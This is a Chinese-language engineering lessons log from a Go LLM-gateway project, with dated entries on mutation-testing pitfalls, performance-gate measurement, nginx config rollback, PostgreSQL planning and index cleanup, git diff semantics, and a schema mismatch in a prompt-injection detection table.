- 场景：tuning 协调门的 10 条变异在**提交后的树**上复跑时，M8（删掉 follower 跳过时的指标记录）与 M9（删掉白名单校验整块）两条都报了「判据变红」——但失败行是 **`FAIL github.com/kaixuan/llm-gateway-go/bg [build failed]`**，**不是**具名断言红。
- 根因：这两条变异**整行/整块删除**代码 ⇒ 顺手让被删语句引用的局部变量或 import 变成「未使用」：
  M8 删掉 `for _, v := range TuningViews` 循环体里**唯一**用到 `v` 的语句 ⇒ `v declared and not used`；
  M9 删掉白名单块 ⇒ 该块是文件里**唯一**的 `fmt.` 用法 ⇒ `fmt imported and not used`。
  ⇒ 门确实「变红了」，但红在**编译**上，**目标断言一次都没跑**。
- 为什么危险：脚本原先把 `build failed` 与 `--- FAIL` **同列为「红」** ⇒ 脚本**绿**只证明
  「我改的代码让包编译不过」，**不证明**那条腿真的有判别力。⇒ 一条**不外科**的变异可以
  永远「通过」，而真正的腿是否触发**无人验证**。这与「断言要匹配机制」同族，但方向相反：
  这里是**变异**太钝，把门糊过去了。
- 防复发：① 变异脚本必须**分判两类红**——`assertion_fails`（`--- FAIL` / `FAIL\t`）
  与 `compile_fails`（`build failed` / `cannot use` / `undefined:` / `declared and not used` /
  `imported and not used`）；**只有编译红 ⇒ 判该变异不合格**（脚本退出码非 0），
  不许当作「这条腿能红」。② 变异要**外科式**：改**判定条件/取值**而不是删整行
  （本轮修法：M8 把 outcome 标签 `skipped_follower` 改成 `skipped_other`；
  M9 把 `if !isTuningView(view)` 改成 `if false && !isTuningView(view)`）
  ⇒ 包仍能编译，**具名断言**才会红。
- 证据/溯源：`scripts/mutate-tuning-view-coordination-gate.py`（改 M8/M9 + 加两类红的分判），
  `scripts/mutate-autoroute-index-sql-gate.py` 与 `scripts/mutate-s4-recorded-cost-skip-gate.py`
  同步加同一分判。⚠ 同族见 2026-10-20「判据与变异脚本自身的三种假信号」
  （那三条是「替换串自己命中判据」「SIGPIPE 把转红判成没转红」「没校验还原」；
  本条是**第四种**：编译红冒充断言红）。

## 2026-10-20 — 性能门的墙钟读数要先分清「在烧 CPU」还是「在等 CPU」：满载机器上 p99 门测的是**宿主调度延迟**（Seen: 1/3 个不同工作日）
- 场景：既有门 `TestSelectP99Under1ms`（`domains/nodestatecache`，闸 p99 < 1 ms）**独立复跑仍红**。三轮读数在**同一份代码**上漂移：3.97 → 20.79 → 25.15 → 31.19 → 32.74 → 34.79 ms（**8 倍**），而 p50 始终 ~60~66 µs。
- 判别动作（决定性）：每个样本**同时记墙钟与进程 CPU 时间**（`syscall.Getrusage(RUSAGE_SELF)` 前后差），看**慢样本烧了多少 CPU**：
  p50 wall 65.75 µs / cpu 67 µs；p90 wall 425 µs / cpu 73 µs；
  p99 wall **32.74 ms** / cpu **1.11 ms**；p999 wall 117.77 ms / cpu 524 µs；max wall 163.06 ms / cpu 1.05 ms。
  最慢 1%（41 个样本）**合计墙钟 2.95 s、CPU 仅 30.7 ms（占 1.0%）**，41/41 全部 `cpu < 墙钟/2`。
  ⇒ **99% 的时间是等待，不是计算** ⇒ 门红的是**宿主调度延迟**，不是 `Select` 变慢。
- 两条被顺手排除的假因：① **不是 GC**——`GOGC=off` 复跑 p99 仍 27.31 ms（同量级）；
  （⚠ `GOGC=off` 会加剧分配/缺页，所以它只排除「GC 主导」，不构成「完全无分配影响」的证据）
  ② **不是本轮引入**——`git diff <基线> HEAD -- domains/nodestatecache` 为空，本轮改动零重叠。
- 防复发：① 任何**只看墙钟**的性能门（p99/p999/max）在**共享大机器**上都要先问「这个读数里有多少是等待」；
  ⇒ 要么把门改成**按 CPU 时间**计，要么在**足够空**的机器上测，要么用 `testing.Short()` 逃逸
  （本仓这条门**已有** `if testing.Short() || raceEnabled { t.Skip }` 逃逸 ⇒ CI 侧用 `-short` 即可跳过）。
  ② 报告这类读数时**必须带上 p50 与 CPU 时间**，只报 p99 会被读成「实现变慢了」。
- ★ 测量手段（共享仓不落盘）：用 `go test -overlay` 把临时诊断测试**注入**包编译，
  文件只存在于 `/tmp` ⇒ **仓库零写入**、不污染别人的 `go test ./...`：
  ```bash
  # /tmp/overlay.json: {"Replace": {"<repo>/pkg/zz_diag_test.go": "/tmp/zz_diag_test.go"}}
  go test ./pkg/ -overlay /tmp/overlay.json -run TestZZDiag -count=1 -v
  ```
- 同族：2026-10-19「计时敏感门在并行满载机器上假红」是**结论**，本条是它的**机理 + 测量法**。
  ★ 同族：[[0 命中的第一嫌疑是量具坏了]] · [[阈值型判据先量噪声底]] ·
[[假绿也要当缺陷一样复核]] · [[阴性结论要当缺陷一样复核]]。

## 2026-10-20 — 「先改配置再校验配置」失败时必须还原文件：否则留下潜伏半切换态（Seen: 1/3）
- 场景：211 蓝绿切流（改 nginx upstream 主 server 行 → `nginx -t` → reload）。判据门场景⑤抓到：`nginx -t` 失败时**磁盘配置已被改写**（已指向候选端口 8782），而 nginx 跑的仍是旧配置（8781）。
- 根因：实现是「改文件 → `nginx -t` → 失败就只 warn 不 reload」。失败瞬间**流量没变**（暂不致命），但磁盘与运行态已分叉 ⇒ 此后**任何一次** nginx reload（人工的、systemd 的、crontab 的）都会把这份**未经验证**的配置加载进去 ⇒ 半切换态是**潜伏**的，不是当场可见的。
- 防复发检查：① 任何「先写配置、再校验配置」的动作，校验失败时必须把文件**还原**（本轮改成「先备份改前内容 → 改文件 → `nginx -t` → 失败则 `cp` 还原」）；② 备份必须**每次**都写「改前内容」——旧实现是「只在备份不存在时写」⇒ 还原会拿到**更早的版本**（另一层潜伏缺陷）；③ 判据要有行为层：真 nginx conf + 替身 nginx，让 `-t` 失败并断言「upstream 未被改」+「没有 reload」。
- 证据：`tests/deploy_211_teardown_order_test.sh` 场景⑤（真 conf 文件 + `nginx` 替身，替身复刻「`-t` 失败就不许 reload」的语义）；变异「nginx -t 失败不还原配置」2 条断言红、「切流跳过 nginx -t」4 条断言红。
- 溯源：本轮 211 蓝绿改造；[复盘](docs/audit/2026-10-20-211-bluegreen-docker-engine.md)。

## 2026-10-20 — 泛化重构后旧判据变红：先分「判据过时」与「真缺陷」，再动手（Seen: 1/3）
- 场景：把 `deploy-211-docker.sh` 泛化成主机无关的 `deploy-seamless-docker.sh`（`D211_`→`DD_`，主机名进薄外壳）后，契约门 4 条红。
- 真因分类（**这才是关键**）：① 「`--via` 转发 `DD_GO_BASE_IMAGE`」红——旧判据 grep **字面量** `DD_GO_BASE_IMAGE='`，泛化后转发改成「显式清单 + 通用展开」⇒ 字面量消失但**转发没坏** ⇒ 改判据；② 「引擎默认基础镜像仓钉 registry-211」红——泛化后引擎**本就不该**钉主机名 ⇒ 改判据成「引擎按 target 拼」+「引擎不含写死主机名」+「薄外壳钉 211 的」；③ 「version.json 改写」红——**这条是真缺陷**：槽位隔离后改写仍指向**未被挂载**的平铺路径，且 python 只传 2 个参数却读 `sys.argv[3]` ⇒ IndexError 被 `|| warn` 吞掉 ⇒ 失败形态是「**静默不改写**」，线上 `/version` 继续显示别人的版本戳。
- 防复发检查：① 泛化重构后逐条判据红时，先问「这条判据钉的是**契约**还是**实现形态**」——钉契约而实现形态已变 ⇒ 改判据并**同时**守住契约的新形态（例：「转发清单里有该变量」+「通用展开那行在」两件事都要判，只判一件会漏「清单里有但没展开」/「清单里没有」）；② 判据红**不总是**判据的错：先查「新形态下这个契约还成立吗」——不成立就是真缺陷。
- 证据：契约门 118/0（含新增「引擎不含写死主机名」「改写目标是本槽副本」等反向断言）；顺序门 48/0。
- 溯源：本轮 211 蓝绿改造；[复盘](docs/audit/2026-10-20-211-bluegreen-docker-engine.md)。

## 2026-10-20 — 变异 harness 自身的两种「假通过」：变换没执行、类型用错（Seen: 1/3）
- 现象一：10 条变异**全部**报「没打中（副本与原件逐字节相同）」。真因：harness 把 transform 当**普通参数**传进 `python3 -`（`sys.argv` 里躺着代码但**没人 exec 它**）⇒ 副本压根没变。
- 现象二：改成 `python3 -c` 后仍有 3 条 `anchor-miss`。真因：transform 里用 `.read()` 拿到的是**字符串**，而代码按**行列表**用（`enumerate(str)` 迭代出来的是**字符**，永远匹配不上多字符锚点）。
- 防复发检查：① 变异 harness 必须有「**变异确实生效**」的自证（`cmp` 副本 vs 原件必须不等；不等才允许继续）；② harness 自身报错（anchor-miss / 语法错 / 退出码非零）必须与「被测代码有问题」**分开归类**——这正是「0 命中的第一嫌疑是量具坏了」在写 harness 阶段的形态，不是事后才该想起；③ 判据读数只认「真断言红」（输出里有断言行），脚本提前退出不算「被抓住」。
- 证据：本轮 harness 两版：首版 0/10 命中、第二版 6/10（4 条 harness 自身故障）、第三版 10/10 命中；harness 与变异规格在 `/tmp/mut_verify_211_bluegreen.sh` + `/tmp/mut_specs_211.json`。
- 溯源：本轮 211 蓝绿判据门。

## 2026-10-20 — 「通用引擎 + 薄外壳」泛化：主机名一个字都不能留在引擎里（Seen: 1/3）
- 场景：把 211 专属的 Docker 部署脚本改造成可复用于多台 Docker 主机的通用引擎（`deploy-seamless-docker.sh`），主机信息全部由薄外壳（`deploy-211.sh`）用环境变量注入。
- 根因/教训：泛化不是「把主机名换成变量」就完了——**默认值、备份文件名、注释里的主机名**都会在下一台主机上变成错的：① 引擎默认 `DD_BASE_REGISTRY=registry-211.itestu.cn` ⇒ 新主机会去拉 211 的仓（已改 `registry-${DD_TARGET}.itestu.cn`）；② 备份文件后缀 `.bak-d211-realip`（已改 `.bak-dd-realip`）；③ 引擎里的 `gw211_` 静态 key 前缀必须按 target 拼（否则新主机的 key 与 211 同前缀）。
- 防复发检查：① 泛化后 `grep -n "<主机名>" 引擎` 只允许剩**历史说明性注释**，任何会影响行为的字面量都要清；② 判据加**反向断言**：「引擎不含写死的主机名」（`registry-211` 这类字面量不得出现）+「引擎默认按 target 拼」；③ 复制引擎 = 两份语义各自演化必然漂 ⇒ 新增主机只允许新增**薄外壳**；④ 薄外壳里 `DD_STATE_DIR` 这类**存密钥/状态**的路径不可改（换路径 = 换 SECRET_KEY = 库内 key 全失效）。
- 证据：契约门新增「引擎默认基础镜像仓按 target 拼」「引擎不含写死的主机专属仓名」两条；211 薄外壳 `scripts/deploy-211.sh` 只含主机信息 + 家族骨架。
- 溯源：本轮 211 蓝绿改造；[复盘](docs/audit/2026-10-20-211-bluegreen-docker-engine.md)。

## 2026-10-20 — 「执行快」不等于「语句快」：慢 SQL 必须把 Planning Time 与 Execution Time 一起读（Seen: 1/3）
- 场景：request_logs→session_turns 退役复核轮，真实请求全部 200，但 session 族几乎不落库（正文 JSON null、trace 丢、turn_no 与时间序错位）。查遍锁等待（`pg_blocking_pids` 空）、查遍连接数（12/200、9 idle），都不是。
- 真因：连 `SELECT count(*) FROM session_turns_hot WHERE 1=0` 这种**空查询**，`EXPLAIN ANALYZE` 报 `Execution Time: 0.03ms` 而 `Planning Time: 1195ms`。根因是本机 PG 的 `shared_buffers` 被**手改**成 400kB（PG 默认 128MB）⇒ 规划期要读的 catalog 页根本进不了共享缓冲。改成 2GB 后：规划 1195ms → **50ms**（24×），执行时间**一点没变**。
- 防复发检查：① 看慢 SQL 时 `Planning Time` 与 `Execution Time` **必须一起读**——只看执行时间会把「慢」整个漏掉；② `EXPLAIN` 之外，还要量**空查询**的规划耗时（它把「与数据量无关的那部分成本」单独暴露出来）；③ 部署/验收前先量一次 `SHOW shared_buffers`，低于 128MB 一律先修再谈性能。
- 通用式：**慢 SQL 有两个时间维度，"执行计划快"不等于"语句快"**；而规划期的开销几乎全部来自**catalog 访问**⇒ 共享缓冲不足时，SQL 写得再漂亮也没用。
- 证据/溯源：`docs/audit/2026-10-20-request-logs-session-turns-复核轮.md` §2.3；`scripts/deploy-local-lib.sh` 新增 `dl_pg_check_memory` + `scripts/deploy-local-lib-pgmemory_test.sh`（4 条变异全红）。

## 2026-10-20 — 「注释说改好了」不等于「改生效了」：改某个值的来源前，先把它的解析顺序列出来（Seen: 1/3）
- 场景：`internal/sessionv2mirror/hook.go` 的注释写着「raise the default budget to 2000ms」，代码里 `defaultShadowWriteTimeoutMs` 也真的从 500 提到了 2000。**但那次修复从未生效。**
- 真因：`settings.GetPlatformInt(key, fallback)` 的解析顺序是 **DB → env → `spec.Default` → 代码里的 fallback**。`settings/spec_sessions_v2.go` 里这条的 `Default: 500` 一直没改 ⇒ **spec.Default 先命中**，代码里那个 2000 永远走不到。实际预算一直是 500ms，而 500ms 撑不住一次 shadow write 的串行步骤 ⇒ 正文整段不落、整笔写走 outbox 异步重放 ⇒ **turn_no 与请求顺序错位**、trace 丢失。
- 防复发检查：① 改「某个值的来源」时，**先列出它的解析链**，确认自己改的那一层**真的在链上**；② 同一语义的值只允许**一处**有字面量（判据从**源码**取字面量，不是复制品）；③ 判据要同时钉「一致性」与「方向性」：一致但都偏小，同样是缺陷。
- 通用式：**生效的是「链上第一个命中的那一层」**，不是「你改的那一层」；注释与代码一致 ≠ 生效。
- 证据/溯源：同上文档 §2.4；`settings/session_write_timeout_default_test.go`（2 条变异全红：spec 回 500 / 常量改 1500）。

## 2026-10-20 — 「给旁路单独开一个 ctx」不等于「预算分开了」：预算分离 = 计时起点分离（Seen: 1/3）
- 场景：维度写（`session_dim` upsert，其触发器还要 UPDATE `session_summaries`）与轮次写共用一个 ctx ⇒ 维度写慢就把**主体**的 deadline 吃光 ⇒ 主体写失败、旁路却「成功」了。
- 真因（第一版修法被自己的判据当场抓住）：光「再开一个 `WithTimeout(bg, timeout)`」**没用**——两个 ctx 的 deadline 是**同一个绝对时刻**（t0+timeout），维度写照样耗光主体的预算。实测轮次写拿到的剩余预算是 **−0.8ms**。⇒ 轮次写的 ctx 必须在维度写**之后**才建，预算才真的从「轮次写开始」起算。
- 防复发检查：① 「给两段各用各的预算」判据要**行为**化：让前一段把预算烧光，后一段拿到的剩余必须仍接近满额；② 改完之后必须报出**总墙钟上限**的变化（本例 timeout → ≤2×timeout），别让「总时间变长」变成隐式代价。
- 通用式：**预算分离 = 计时起点分离**，不只是「换个 ctx 对象」。与 LESSONS「同一次判定里的不同判据可以有不同的时间语义」是同一条：**旁路不许吃主体的预算**。
- 证据/溯源：同上文档 §2.5；`internal/sessionv2mirror/shadow_write_budget_test.go`（变异 M1 改回共用 ctx → 红）。

## 2026-10-20 — 部署验证通过 ≠ 数据可用：任何「落库了」的结论都要有一份**读回**证据（Seen: 1/3）
- 场景：迁移 RC0、部署 `VERIFY_PASS=1`、探活 200、接口 200、后台零 ERROR——但 session 族**一行都没落库**。`VERIFY_PASS` 探的是进程/端口/版本，**从不探「写进去没有」**。
- 真因：两个叠加的根因（`shared_buffers=400kB` + spec 默认 500ms 静默撤销修复），两者都让写路径在毫秒级 deadline 内超时，而失败是**静默**的：接口 200、日志只有 WARN。
- 防复发检查：① 「数据可用」的结论必须由**读回**支撑：正文用 `jsonb_typeof(col)='array'`（**不是** `IS NOT NULL`——JSON null 也满足）、`turn_no` 连续性、`trace_events` 非空；② 「接口 200」**不是**落库证据；③ 部署链上加**环境前置门**（本例：shared_buffers 下限），让「部署成功但数据不可用」这种组合在部署阶段就报出来。
- 通用式：**验收口径必须覆盖「产出」而不是只覆盖「过程」**；一个只探过程的门，会在最需要它的时候全绿。
- 证据/溯源：同上文档 §2.1–§2.6。

## 2026-10-21 — 「0 扫描」的四种成因，只有一种能当删索引的依据（Seen: 1/3 个不同工作日）
- 根因：把「这条索引 0 次扫描」直接读成「没人用 ⇒ 可 DROP」。实测同一张库里 0 扫描有**四种**成因：① **表是只写表**（写入路径根本不走它）；② **功能默认关闭**（`route_incident_events` 的留存 worker「默认不启用」，但它**启动时探索引**、缺了就跳过 ⇒ 删了 = 永久关掉留存）；③ **被别的索引遮住**（查询存在但计划器选了另一条）；④ **真没人用**（仓库无读方 + 生产计划不选）。只有第 ④ 种能进 DROP 候选。
- 防复发检查：① 判「可删」前先给每条候选补**仓库读方 grep + 生产 EXPLAIN** 两份证据，并明确写出它属于哪一类成因；② **feature-gated 的路径要单独标出**（grep 该功能的默认开关与「缺索引就跳过」的分支）；③ ★ **探针的选择性必须与真实查询一致** —— 本轮自己用 `WHERE created_at < now()` 探留存索引，**无选择性 ⇒ Seq Scan** ⇒ 差点判成「没人用、可 DROP」；换成真实 cutoff（`now() - interval '30 days'`）⇒ 计划走该索引 ⇒ 判词反转。⇒ 「对照组不是同一条件下造的」这条纪律在索引侧同样成立。
- 实际证据/溯源：runbook §143.16.4（14 条生产 EXPLAIN + 仓库读方定位）；§143.9.6 E 类表的就地订正横幅（那一列是**表级**计数，18 条里至少 6 条的每索引计数其实是 0）。

## 2026-10-21 — 量具的「分项和」能证明它没把同一块算两遍（Seen: 1/3 个不同工作日）
- 根因：回收量公式 `dead + leaf×(1−min(density,90)/90)` 里，「死页」与「密度缺口」若指向同一批页，公式就**重复计数**、把收益报大一倍 —— 而这在文本上完全看不出来。破局点是**把量具的分项和与总量对齐**：`blocks = 1(meta) + internal_pages + leaf_pages + empty_pages + deleted_pages` 在 10 条读数上**逐条精确成立** ⇒ 死页与叶页**不相交** ⇒ 公式结构上无重复计数。同一条恒等式还顺带钉死了 `deleted_pages` 的语义：**它物理仍在索引里**（不是「已从索引删除」的会计数）⇒ 才是可回收项。
- 防复发检查：① 用任何**多项相加**的估算公式前，先找一把能给出**分项和 = 总量**恒等式的量具，并对多条读数逐条验证；② 恒等式不成立时，**先怀疑公式重复计数**，再去调参数；③ ★ 配套结论：**`VACUUM` 回收不了 btree 死页**（本地 PG 17.11 七阶段对照：连续两次 VACUUM 后 `deleted_pages` 与 `index_size` 一字未变；生产侧该表已 autovacuum 17 次、死页至今仍在）⇒ 只有 **REINDEX** 能清 ⇒ 「跑个 VACUUM 就行」是错的处置方向。
- 实际证据/溯源：runbook §143.16.1（恒等式表 + A~G 七阶段受控实验 + 生产 autovacuum 互证）；最刺眼的一条：`request_stats_error_drill_minute_pkey` 61.2MiB 里 **7413/7831 块（94.6%）是死页**，活的部分只有 ≈3.2MiB。

## 2026-10-21 — 删「重复的唯一索引」前，先问「它是不是唯一的仲裁索引」（Seen: 1/3 个不同工作日）
- 根因：`ON CONFLICT (col)` 的仲裁索引必须是**非部分唯一索引**（主键本身也算）。当主键 `PRIMARY KEY (col)` 与一条裸 `UNIQUE (col)` 并存时，两者的 `pg_index.indkey` 相同 ⇒ **键集逐字重复** ⇒ 裸的那条是纯冗余（生产实测两份各 ~67MiB，且热表每次写都多维护一份 B-tree）；但若**表没有主键**（本仓的 memora 最小 shape 场景），那条裸索引就是**唯一**的仲裁索引 ⇒ 无条件删会让 `ON CONFLICT` 直接失败。⇒ 「冗余」不是静态属性，**取决于同一张表上还有没有别的仲裁索引**。
- 防复发检查：① 判一条唯一索引「可删」前，先查 `pg_index` 里**同一列上还有没有别的非部分唯一索引**（`indisunique AND indpred IS NULL AND indnkeyatts=1`）；② 判据**抽成一个常量、两处共用**（bootstrap 的创建守卫 + canonical 短路的缺失判定）⇒ 结构上杜绝漂移；③ 仲裁语义用**真库实测**背书：本地 PG 17.11 `Conflict Arbiter Indexes: arb_t_pkey, arb_t_uidx` → 只剩 PK 时 `arb_t_pkey` ⇒ 删裸的那条，冲突语义不变。
- 实际证据/溯源：runbook §143.16.3（T1/T2 分档）与 §143.16.5.2（对「71MB 逐字重复对」的订正：真实冗余是**三条 145MiB**，且原文「pkey 是约束、删它要先改约束」**弄反了**——uidx 是独立唯一索引，要改约束的是 `UNIQUE (tenant_id, session_key)`）；真库判据探针六形态（主键/裸 uidx/部分/两列/无/两者并存）全部符合预期；门 `db/session_summaries_arbiter_test.go` 4 条，变异 M1~M5 全红。

## 2026-10-21 — 门钉源码**字面形态**，跑一次 gofmt 就假红（Seen: 1/3 个不同工作日）
- 场景：给 `session_summaries` 的条件化索引写判据，门断言「bootstrap 里的引用形态是
  ``IF NOT EXISTS (` + 常量 + `) THEN``」。全绿、变异 M1~M5 全红、还原 md5 一致 —— 一切正常。
  随后例行跑 `gofmt -w`：**两条门当场变红**，而代码语义一点没变。
- 真因：gofmt 会把 ` + 常量 + ` 压成 `+常量+`（它是更大表达式的一部分）⇒
  门钉的是**排版**不是**语义** ⇒ 任何一次格式化都会把门变成假红。
  ⇒ 这与「旧判据钉死缺陷」同族但方向相反：那次是**门钉住了错的**，
  这次是**门钉住了会变的** —— 两者都让门测不到东西。
- 防复发检查：① 断言**源码形态**的门，一律用**正则**（允许空白/引号形态变化）而不是字面串；
  ② 判据里出现 Go 标识符的**引用**时，用「标识符 + 上下文形状」而不是「整串文本」；
  ③ ★ **变异脚本的锚点必须与门同款**（同一次改动里一起改）——
  门改成对空白不敏感而变异脚本还用字面锚点 ⇒ python assert 炸掉，
  更糟的是「静默什么都没改」被误读成「门抓不住这个缺陷」；
  ④ 提交前把 `gofmt -w` 纳入流程（在变异验证**之后**），并把门**再跑一遍**。
- 实际证据/溯源：`db/session_summaries_arbiter_test.go` 与
  `scripts/ursmcheck/migration_879_redundant_uidx_drop_test.go` 各改一处断言
  （字面串 → 正则），改完对**最终版门**重跑变异 M1~M5 / M1~M4 全红、还原 md5 逐字一致。

## 2026-10-20 — 诊断命令**别用 `tail -N` 截断输出**：失败用例名会被你自己吃掉（Seen: 1/3 个不同工作日）
- 场景：合并后跑 `go test ./security/sanitize/ -count=1 2>&1 | tail -8` ⇒ 看到 `FAIL`，但**输出里只剩 WARN 行和 `FAIL` 汇总**，`--- FAIL: TestXxx` 那行**刚好在 tail 窗口之外** ⇒ 复现率约 1/7（随后连跑 6 轮全绿）⇒ **拿不到失败用例名，就不能下任何结论**。
- 根因：这是**我自己的量具坏了**（不是被测代码的问题）：`-v` 的逐用例输出里，失败名与断言详情在**用例块中间**，`tail -N` 只保留末尾 ⇒ 恰好把证据切掉了。⇒ 表现极具误导性：读起来像「包不稳定、但说不清哪条」。
- 防复发：① 诊断类命令**要么全量落文件**（`> /tmp/x.log 2>&1`）再 grep，要么**直接 grep 要的那几行**（`grep -E '^--- FAIL'`），**不要用 `tail -N`**；
  ② 断言「这条不稳定」时，**必须同时给出「失败用例名」**；给不出名字就只能说「有一个不稳定、名字未捕获」，
  **不能升级成「某条测试 flaky」的结论**；③ 复现率低（1/7）时，**连跑 ≥6 轮**再判定「未复现」，
  并把「未复现」与「已修复」区分开（本轮就属于前者 ⇒ 登记项，不是不存在）。
- 同族：2026-10-20「判据与变异脚本自身的三种假信号」第 ② 条（SIGPIPE 把「转红」判成「没转红」）
  —— 那条是**管道状态**骗人，本条是**截断**骗人；共同点：**量具自己的行为制造了假信号**。

## 2026-10-20 — 合并冲突解决后必须做一次**文档结构体检**：围栏配对 + 表格列数（Seen: 1/3 个不同工作日）
- 场景：共享仓合并冲突（handoff 文档 3 块）解完后，我把「对方的节」与「我的节（改号 §十一）」并排拼装。
  拼装脚本里我给「我的 §11.3」**额外插入了一个开启围栏**（```），而原 §10.3 读数块的**开启围栏原本在 git 的「公共上下文」里**（两个冲突块之间）⇒ 变成：
  **多一个开启围栏 ⇒ §11.3 末尾那个 ``` 成了新的开启围栏 ⇒ §11.4 纪律节、§11.5 遗留风险整段被渲染成代码块**，
  §11.6 下一轮提示词的开围栏因此变成「代码块里的字面量」。
- 表现极具误导性：**文件里所有文字都还在、git 也看不出来**（`git diff` 正常、无冲突标记），
  只有**渲染**才是坏的 ⇒ 不体检就发现不了 ⇒ 读文档的人看到的是一大段灰底等宽字。
- 防复发：① 合并/改号后跑一次**结构体检**（30 行脚本）：
  (a) **围栏配对**——按「列 0 的 ```」与「列表内缩进的 ```」分别统计奇偶；
  (b) **表格列数一致**——按行统计 `|` 数，**先剥掉 `\|` 与行内代码块里的 `|`**（否则假阳性）。
  ② 拼装多节文档时，**每个小节的围栏成对自检**，别依赖 git 的「公共上下文」替你保留围栏。
  ③ 体检脚本本身要有**已知假阳性清单**（本轮第一次跑就因 `printf\|grep` 误报 3 处）。
- 同族：[[共享仓库收尾：用 git merge-tree 只读预演「合并冲突块数」]] · [[0 命中的第一嫌疑是量具坏了]]。

## 2026-10-20 — 测「上游改了什么」的 diff 基：**本地有未推送提交时，两点 diff 的方向含义会反转**（Seen: 1/3 个不同工作日）
- 场景：第二次合并后远端又前进 7 个提交，我要核「上游这 7 个提交有没有碰我本轮改的 15 个文件」。
  我先跑 `git diff --name-only HEAD origin/main -- <我的 15 个文件>` ⇒ **15 个文件全列出来了**，
  读起来像「上游把我的文件全删了」（`bg/tuning_view_refresher.go | 341 +------------` 正是这个形态）。
  ⇒ 我差点照着这个读数下「上游与我的改动正面冲突」的结论。
- 根因：**量具的基选错了**。`git diff HEAD origin/main` 的语义是「**我本地未推送的提交** 相对 远端差了什么」——
  我的改动**不在** `origin/main` 里 ⇒ 这条 diff 的主语是**我**，不是上游。
  ⇒ **当本地有未推送提交时，两点 diff 的「谁改了」的方向与直觉相反**：
  列出来的文件 = 「我改了但远端还没有」，不是「远端改了」。
  正确基是**上次合并点**（本轮 `e888e067a`）：`git diff <上次合并点> origin/main -- <文件>`。
- 防复发：① 问「**谁改的**」而不是「**有没有差异**」——前者必须用「**上次合并点 → 新远端头**」作基；
  ② `git diff A B` 里的 A 是**基**、B 是**目标**；想看「远端相对我的基新增了什么」，
  A 必须是**基线提交**而不是「我的 HEAD」；
  ③ 核对零重叠时**逐文件列名**、并**把上游这批提交改动的全部文件单列一遍**再取交集
  （本轮正确量具的输出：上游只碰了 `bg/` 的**探针族** `probe_*.go` / `active_probe_executor.go` /
  `model_probe.go` / `credential_probe_response_validation.go` + i18n 族 + handoff 文档 ⇒ 与我的 15 个文件零重叠，
  **唯一的共同文件是 handoff 文档本身** ⇒ 第三次合并预计只在那一个文件上冲突）。
- 同族：AGENTS.md §28「`git diff main...branch` 三点 diff 反映的是双向漂移」是**同一族的另一个形态**；
  本条补的是「**未推送提交会把两点 diff 的主语换掉**」；
  ★ [[共享仓库多会话：验证 run 会被别人的 push 取消]] · [[先读量具再读产物]] · [[0 命中的第一嫌疑是量具坏了]]。

## 2026-10-20 — 同一张表有两套形状时，先问「哪一份是正典」：迁移文件里的 `IF NOT EXISTS` 会把列声明变成空操作（Seen: 1/3）
- 场景：逐页浏览器扫描（104 页）时抓到 `/api/admin/prompt-injection/detections` 恒 500，服务端报 `42703 column "detection_score" does not exist`。这一列在 `sql/migrations/startup/315_prompt_injection_detection.sql` 里明明写着。
- 根因：**正典形状**（`sql/schema/01-schema.sql` + `sql/objects/tables/prompt_injection_detections.sql`）的 `risk_level` 是 **integer 分数（1..10，带 CHECK）**，且**没有** `detection_score`/`matched_rules`/`matched_rules_count` 三列；而 315 声明的是另一套形状。315 的建表语句是 `CREATE TABLE IF NOT EXISTS` ⇒ **在已有正典表的库上是空操作** ⇒ 315 声明的列**从未被创建** ⇒ 查它们的代码恒 42703。⇒ 迁移文件是「声明」，`sql/schema/`+`sql/objects/` 才是「正典」；**声明可能从未生效**。
- 防复发检查：① 看到 `42P01/42703` 时，先去**正典**里核这一列/视图在不在，再去核「是哪条迁移声明的」——后者很可能就是没生效的那条；② `CREATE TABLE IF NOT EXISTS` 只在「表不存在时」才是建表，在已有表的库上它**静默什么都不做**——凡是用它声明**列**的迁移，都必须先核正典形状；③ 判据要钉**正典形状**（逐字跑生产 SQL 让 PG 自己解析），不能钉「迁移文件里写了什么」。
- 证据：`admin/prompt_injection_canonical_shape_test.go`（真库逐字跑生产投影与统计 SQL）；`domains/promptinjection/detector_canonical_shape_test.go`（真库写侧 + 旧形状变异见证）；变异 6/6 全被抓住。
- 溯源：本轮 request_logs→session_turns 复核轮；[审计](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md §5.6.1)。

## 2026-10-20 — 形状错配同时毒化读侧与**写侧**，而写侧常被降级成 WARN ⇒ 审计记录静默丢失（Seen: 1/3）
- 场景：同一张 `prompt_injection_detections` 表的形状错配，让读侧 500（可见），也让**写侧**每次 INSERT 都失败 —— 而失败只落一行 `slog.Warn("prompt_injection: failed to log detection")`。
- 根因：**注入检测照常生效/拦截，只是审计记录一条不留** ⇒ 页面/报表上「这批请求没有注入命中」成了**假结论**。同族先例：攻击向量库写侧（a56338ee2，`learnAttackPattern` 恒失败、表恒 0 行）。
- 防复发检查：① 凡「写不进去只记 WARN」的写点，优先怀疑「列/类型对不上」，而不是「偶发失败」；② 这类 WARN 升级为 **Error**（审计链断掉是安全事件，不是噪声）；③ 写侧要有**真库落库判据**（事务 + 回滚 + 读回），mock 门只认「有一条 INSERT 发生过」⇒ 对参数类型不敏感，**旧 bug 在 mock 下照样全绿**。
- 证据：本轮把写侧失败从 `slog.Warn` 升为 `slog.Error` 并带 tenant/request/score；真库门 `TestInsertDetectionSQL_LandsInCanonicalShape` 读回 risk_level/rule_name/category/categories。
- 溯源：同上 §5.6.1。

## 2026-10-20 — 真库门能抓到 mock 抓不到的东西：把生产 SQL 提成包级常量，让判据**逐字**跑它（Seen: 1/3）
- 场景：本轮新写的 6 道真库门，在**写的过程中**当场抓到我自己的 4 个错误：`AS c` 把列别名写成了表别名（应为 `AS t(c)`）；`FROM` 跑到了子查询**外面**；`categories` 绑了 JSON 字节（PG 数组字面量 22P02）；判据自己把数组扫进 `*string`。
- 根因：这 4 条**在 mock 下全绿** —— pgxmock 对参数类型不敏感，只认「有过一次调用」。⇒ 判据抄一份 SQL 会与生产**漂移**，且漂移了没人知道；判据自己绑错类型则把自己的错当生产的错。
- 防复发检查：① 生产用的 SQL 提成**包级常量**（`insertDetectionSQL` / `promptInjectionDetectionsSelectCols` / `promptInjectionStatsSQL` / `userProfileBaseStatsSQL`），判据**逐字**跑它，不许抄；② 判据的绑定参数必须与生产**同形**（`pq.Array` vs JSON 字节）；③ 判据自己的扫描目标类型要和列类型对得上（数组扫进 `[]string`、timestamptz 扫进 `*time.Time`）——判据红时先分「生产错」还是「判据错」。
